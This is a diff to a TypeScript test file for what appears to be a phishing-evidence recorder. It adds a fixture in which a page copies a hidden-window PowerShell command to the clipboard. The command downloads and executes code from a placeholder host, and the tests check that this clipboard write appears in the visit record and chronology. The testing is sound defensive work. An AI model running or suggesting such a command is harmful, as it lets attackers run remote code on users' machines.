@@ -33,6 +33,7 @@ const facts: VisitEvidenceFacts = {
 		},
 	],
 	backends: [],
+	clipboardWrites: [{ text: "powershell -w h -c \"iex(irm https://payload.example/a)\"", documentUrl: "https://policy-trust-assurance.onrender.com/help", via: "writeText", at: "2026-11-15T00:32:54.100Z" }],
 };
 
 describe("the visit as evidence", () => {
@@ -76,6 +77,11 @@ describe("the visit as evidence", () => {
 		expect(typedEmail).toBeGreaterThan(0);
 		expect(clicked).toBeGreaterThan(typedEmail);
 		expect(sent).toBeGreaterThan(clicked);
+		// What the page put on the clipboard is part of the chronology and the record.
+		const copied = text.indexOf(`Page https://policy-trust-assurance.onrender.com/help put on the clipboard (writeText): ${JSON.stringify(facts.clipboardWrites[0]!.text)}`);
+		expect(copied).toBeGreaterThan(clicked);
+		expect(sent).toBeGreaterThan(copied);
+		expect(parsed.clipboardWrites).toEqual(facts.clipboardWrites);
 		expect(text).toContain("Requests that carried a synthetic value: 1. Every other request the browser sent during the visit (1)");
 		expect(text).toContain(`SHA-256 of visit-record.json: ${sha256Hex(record!.bytes)}`);
 	});
